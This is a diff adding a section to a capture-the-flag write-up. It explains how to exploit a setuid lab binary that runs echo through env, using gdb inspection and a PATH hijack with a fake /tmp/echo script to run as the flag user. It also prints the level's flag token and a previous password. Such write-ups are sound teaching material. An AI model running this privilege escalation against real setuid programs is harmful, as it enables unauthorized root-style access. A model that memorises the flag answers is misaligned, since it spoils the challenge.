@@ -85,3 +85,67 @@ Note that some of the payloads of the password are 0x7f. This is the DEL
 character, which means the user screwed up and deleted part of his input. So _n_
 preceding characters need to be deleted, where _n_ is the number of DEL in a
 row. The final password is: `ft_waNDReL0L`.
+
+## Use the PATH luke (level03)
+
+Here we have binary owned by the flag03 user and the setuid bit on. The level03
+user has execution rights on it, which means that whatever it does will be done
+as if it was the user flag03 that executed it.
+
+By running the binary through gdb and breaking in main, we can see that it calls
+the `system` function to execute an echo command.
+
+```shell
+# run gdb on the binary
+gdb ./level03
+# set a breakpoint at the main function (through gdb's prompt)
+(gdb) b main
+# run the program
+(gdb) run
+# see the assembly code being executed
+(gdb) disass
+```
+
+At the end of the assembly instruction list, we can see these two lines:
+
+```
+   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
+   0x080484fe <+90>:    call   0x80483b0 <system@plt>
+```
+
+The first instruction loads a parameter into esp for the system function call
+on the next line. When printing the string being passed to it (as it is what
+[system](https://man7.org/linux/man-pages/man3/system.3.html) takes as a
+parameter), we can see which command will be executed:
+
+```
+# print the parameter
+(gdb) p (char *)0x80485e0
+# outputs
+$1 = 0x80485e0 "/usr/bin/env echo Exploit me"
+```
+
+Since the echo binary is explicitely located through the env command and not
+hardcoded with an absolute path, we can use the `PATH` environment variable of
+the shell to execute arbitrary code:
+
+```shell
+# write the script that will be executed by the system call
+cat << END > /tmp/echo
+#!/bin/bash
+
+/usr/bin/id
+/bin/getflag
+END
+# make it executable
+chmod +x /tmp/echo
+# run the binary and make the shell look into /tmp for the echo command
+PATH=/tmp ./level03
+```
+
+Which will output:
+
+```
+uid=3003(flag03) gid=2003(level03) groups=3003(flag03),100(users),2003(level03)
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+```
